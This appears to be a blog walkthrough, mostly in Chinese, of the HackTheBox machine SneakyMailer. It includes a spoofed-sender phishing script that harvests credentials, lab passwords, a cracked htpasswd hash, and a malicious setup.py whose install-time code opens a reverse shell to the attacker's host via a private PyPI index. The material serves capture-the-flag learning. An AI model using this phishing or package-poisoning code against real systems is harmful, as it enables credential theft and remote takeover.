@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="NAME:SneakyMailer IP: 10.10.10.197  Difficulty:Medium">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-SneakyMailer">
+<meta property="og:url" content="http://atsud0.me/2020/11/27/HackTheBox-SneakyMailer/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="NAME:SneakyMailer IP: 10.10.10.197  Difficulty:Medium">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127004801114.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201125103827977.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201125105502583.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201125105650491.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126005914799.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126163624437.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127003522512.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126163828723.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126165246450.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126165300195.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126193419030.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126165652845.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126170758163.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126174244372.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126182702581.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126183059194.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127001801966.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127001702883.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126225658727.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126230618077.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127003306173.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127000833982.png">
+<meta property="article:published_time" content="2020-11-27T02:25:50.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.457Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Phishing_email">
+<meta property="article:tag" content="GTFOBins-pip">
+<meta property="article:tag" content="pypi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-20201127004801114.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/11/27/HackTheBox-SneakyMailer/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox-SneakyMailer | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/11/27/HackTheBox-SneakyMailer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-SneakyMailer
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-27 10:25:50" itemprop="dateCreated datePublished" datetime="2020-11-27T10:25:50+08:00">2020-11-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li>NAME:SneakyMailer</li>
+<li>IP: 10.10.10.197 </li>
+<li>Difficulty:Medium</li>
+</ul>
+<p><img src="https://images.atsud0.me/images/post/image-20201127004801114.png" alt="image-20201127004801114"></p>
+<a id="more"></a>
+
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namp -p- sneakycorp.htb</span><br><span class="line">nmap -p80..... -sC -sV sneakycorp.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201125103827977.png" alt="image-20201125103827977"></p>
+<h3 id="directory-busting"><a href="#directory-busting" class="headerlink" title="directory busting"></a>directory busting</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sneakycorp.htb</span><br><span class="line"></span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;img (Status: 301)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;team.php (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;vendor (Status: 301)</span><br><span class="line">&#x2F;pypi (Status: 301)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;sneakycorp.htb&#x2F;pypi</span><br><span class="line"></span><br><span class="line">&#x2F;register.php (Status: 200)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Subdomain-burting"><a href="#Subdomain-burting" class="headerlink" title="Subdomain burting"></a>Subdomain burting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hl 7 -H <span class="string">"Host: FUZZ.sneakycorp.htb"</span> -u http://sneakycorp.htb -t 100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201125105502583.png" alt="image-20201125105502583"></p>
+<p>发现<code>dev</code>子域名</p>
+<h3 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">EHLO localhost</span><br><span class="line">250-debian</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250-DSN</span><br><span class="line">250-SMTPUTF8</span><br><span class="line">250 CHUNKING</span><br><span class="line">HELO localhost</span><br><span class="line">AUTH LOGIN</span><br><span class="line">503 5.5.1 Error: authentication not enable</span><br></pre></td></tr></table></figure>
+
+<p>EHLO 和VRFY都能用，但是禁用了AUTH 所以爆破也没用，尝试了一下也能直接发送邮件（伪造发件人（钓鱼可能性微存。。</p>
+<h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p>这个也是，，直接nc进去不能登陆。估计得用专门的邮件客户端。</p>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p>匿名用户登陆失败。</p>
+<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>访问<a href="http://sneakycorp.htb" target="_blank" rel="noopener">http://sneakycorp.htb</a> 我们可以知道目标的邮件后缀</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201125105650491.png" alt="image-20201125105650491"></p>
+<ul>
+<li>sneakymailer.htb</li>
+</ul>
+<p>从前面发现的dev的子域名，访问后，左侧多了一个注册按钮，点击后跳转注册页面，也就是前面目录扫描/pypi/扫到的，但是提交没反应。</p>
+<h3 id="http-8080"><a href="#http-8080" class="headerlink" title="http-8080"></a>http-8080</h3><p>就一个<code>nginx</code>默认页面</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="smtp-钓鱼邮件"><a href="#smtp-钓鱼邮件" class="headerlink" title="smtp 钓鱼邮件"></a>smtp 钓鱼邮件</h3><p>手写了一个<code>python</code>脚本来发送邮件，先提取所有的邮件地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://dev.sneakycorp.htb/team.php |grep -oE <span class="string">'&lt;td&gt;.*@sneakymailer.htb&lt;/td&gt;'</span> &gt; emails.txt</span><br></pre></td></tr></table></figure>
+
+<p>Python发送邮件代码如下，发送之前记得先开个nc监听1234端口（（为什么不用sweak啊，因为没用过啊。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">from_mail = <span class="string">'admin@sneakymailer.htb'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mail</span><span class="params">(to_mail)</span>:</span></span><br><span class="line">    msg = MIMEText(<span class="string">"Port Report,Please Check&lt;img src='http://Your-IP:1234/a.jpg'&gt;asdasd&lt;/img&gt;ASDASD&lt;p&gt;sdsdsdsdsd&lt;/p&gt;"</span>, <span class="string">"html"</span>, <span class="string">"utf-8"</span>)</span><br><span class="line">    content_part = msg</span><br><span class="line">    m = MIMEMultipart()</span><br><span class="line">    m.attach(content_part)</span><br><span class="line">    m[<span class="string">'Subject'</span>] = <span class="string">'Port Report - Week'</span></span><br><span class="line">    m[<span class="string">'From'</span>] = from_mail</span><br><span class="line">    m[<span class="string">'To'</span>] = to_mail</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = smtplib.SMTP(<span class="string">'10.10.10.197'</span>, port=<span class="string">'25'</span>)</span><br><span class="line">        server.sendmail(from_mail, to_mail.split(<span class="string">','</span>), m.as_string())</span><br><span class="line">        print(<span class="string">'&#123;&#125; success'</span>.format(to_mail))</span><br><span class="line">        server.quit()</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'error:'</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(file=<span class="string">'emails.txt'</span>,mode=<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">       to_mail=f.readlines()</span><br><span class="line"></span><br><span class="line">    new_tomail=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> to_mail:</span><br><span class="line">       a = re.findall(<span class="string">'&lt;td&gt;(.*?)&lt;/td&gt;'</span>, i)</span><br><span class="line">       a= <span class="string">''</span>.join(a)</span><br><span class="line">       new_tomail.append(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> new_tomail:</span><br><span class="line">       write_mail(i)</span><br><span class="line">    print(<span class="string">'All Jobs is Done!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126005914799.png" alt="image-20201126005914799"></p>
+<p>解码之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">firstName&#x3D;Paul</span><br><span class="line">lastName&#x3D;Byrd</span><br><span class="line">user&#x3D;paulbyrd</span><br><span class="line">email&#x3D;paulbyrd@sneakymailer.htb</span><br><span class="line">password&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht</span><br><span class="line">rpassword&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126163624437.png" alt="image-20201126163624437"></p>
+<p>在邮件中找到一个账号密码，从另外一封邮件，我们得知这个服务器上面有<code>pypi</code>服务。。并且low这人要安装测试。。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201127003522512.png" alt="image-20201127003522512"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username: developer</span><br><span class="line"></span><br><span class="line">Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br></pre></td></tr></table></figure>
+
+<h3 id="ftp-获取立足点"><a href="#ftp-获取立足点" class="headerlink" title="ftp 获取立足点"></a>ftp 获取立足点</h3><p>用邮件拿到的凭证测试之后能登陆ftp，但是不能登陆ssh。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126163828723.png" alt="image-20201126163828723"></p>
+<p>看起来是dev子域名的根目录，不过没关系。我们可以直接传shell了，</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126165246450.png" alt="image-20201126165246450"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126165300195.png" alt="image-20201126165300195"></p>
+<p>这靶机也是有脚本自动恢复环境的。所以上传之后要尽快getshell</p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>用以下代码打开一个pty</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>用邮箱找到的密码能切换用户。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126193419030.png" alt="image-20201126193419030"></p>
+<p>接着在<code>/var/www/</code>下发现一个新的网站目录，子域名，并且在里面的<code>.htpasswd</code>看到了一个账号。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126165652845.png" alt="image-20201126165652845"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>john</code>爆破就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pypi.apr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126170758163.png" alt="image-20201126170758163"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi:soufianeelhaoui</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126174244372.png" alt="image-20201126174244372"></p>
+<p>尝试访问下5000端口的服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>5000端口上的服务就是目标私有pypi源服务。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126182702581.png" alt="image-20201126182702581"></p>
+<p>访问看看有什么包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;simple&#x2F; -u &quot;pypi:soufianeelhaoui&quot;</span><br><span class="line"></span><br><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;packages&#x2F; -u &quot;pypi:soufianeelhaoui&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126183059194.png" alt="image-20201126183059194"></p>
+<p>两个目录都是空的。邮件里面说<code>low</code>用户要对<code>pypi</code>模块进行测试，安装。所以猜测有个定时任务或者后台程序之类的东西。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep low</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">low       1071     1  0 07:58 ?        00:00:06 &#x2F;home&#x2F;low&#x2F;venv&#x2F;bin&#x2F;python &#x2F;opt&#x2F;scripts&#x2F;low&#x2F;install-modules.py</span><br></pre></td></tr></table></figure>
+
+<p>果然。。有个安装模块的脚本。不过看不了源码，目录权限写死了。</p>
+<h3 id="上传py模块包-提权-low"><a href="#上传py模块包-提权-low" class="headerlink" title="上传py模块包-提权 low"></a>上传py模块包-提权 low</h3><p>然后两个标准的文件<code>.pypirc</code>和<code>setup.py</code></p>
+<p>.pypirc文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers &#x3D; local </span><br><span class="line"></span><br><span class="line">[local]</span><br><span class="line">repository: http:&#x2F;&#x2F;localhost:5000 </span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure>
+
+<p>恶意setup.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=os.system(<span class="string">'cat /home/low/user.txt'</span>)</span><br><span class="line"><span class="comment"># 这里要做个判断，要不然一上传就弹个www-data的shell回来</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'Your IP'</span>,<span class="number">8888</span>))</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>])</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">'test'</span>,</span><br><span class="line">    version=<span class="string">'0.0.1'</span>,</span><br><span class="line">    author=<span class="string">'atsud0'</span>,</span><br><span class="line">    license=<span class="string">'MIT'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>在执行上传之前，先修改下当前用户的家目录，改成.pypirc所在的目录。为什么要修改呢，就如前面说所这个文件默认就是在家目录，不管是<code>www-data</code>用户还是<code>dev</code>用户，他们的家目录都在<code>/var/www</code>下，他们还没创建文件的权限。所以改个环境变量到tmp下再创建。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $HOME</span><br><span class="line">export HOME&#x3D;&#x2F;tmp&#x2F;project</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201127001801966.png" alt="image-20201127001801966"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py sdist register -r local upload -r local</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201127001702883.png" alt="image-20201127001702883"></p>
